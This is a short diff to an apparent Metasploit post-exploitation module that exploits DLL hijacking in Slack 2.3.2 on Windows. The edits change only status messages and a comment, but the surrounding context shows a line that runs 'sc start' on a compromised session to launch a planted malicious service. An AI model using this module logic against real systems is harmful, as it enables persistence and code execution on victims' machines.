@@ -103,7 +103,7 @@ class MetasploitModule < Msf::Post
                                          # tested on: windows 7 ultimate (32 bits)
                                          [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                 ],
-                        'DefaultTarget'  => '3', # default its to run againts windows 7 ultimate (32 bits)
+                        'DefaultTarget'  => '3', # default its to run againts windows 7
                         'References'     =>
                                 [
                                          [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
@@ -154,7 +154,7 @@ def ls_stage1
     print_warning("Please set LOCAL_PATH option!")
     return nil
   else
-    print_status("Deploying malicious dll into target system!")
+    print_status("Exploiting dll hijacking in slack 2.3.2!")
     sleep(1.5)
   end
 
@@ -180,7 +180,7 @@ def ls_stage1
         sleep(1.0)
 
           # start remote malicious service
-          print_status("Sart slack 2.3.2 remote service...")
+          print_status("Start slack 2.3.2 service remotelly...")
           r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
           sleep(1.5)
 
